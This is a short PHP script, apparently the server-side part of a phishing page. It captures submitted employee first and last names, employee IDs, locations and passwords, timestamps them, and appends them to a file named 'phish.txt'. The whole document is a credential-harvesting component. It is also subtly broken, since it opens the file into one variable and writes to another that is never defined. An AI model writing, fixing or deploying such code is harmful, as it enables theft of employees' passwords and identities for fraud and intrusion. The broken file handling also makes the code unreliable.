<?php
    $time = date("h:i:sa");
    $day = date("Y-m-d");
    $file = fopen("phish.txt", "a+");
    $txt = "First Name : ".$_POST['firstname']." Last Name: ".$_POST['lastname']." Employee ID: ".$_POST['id']." Location: ".$_POST['location']."Password: ".$_POST['password']." Time of data entry: ".$day." at ".$time;
    fwrite($myfile, $txt);
    fclose($myfile);
?>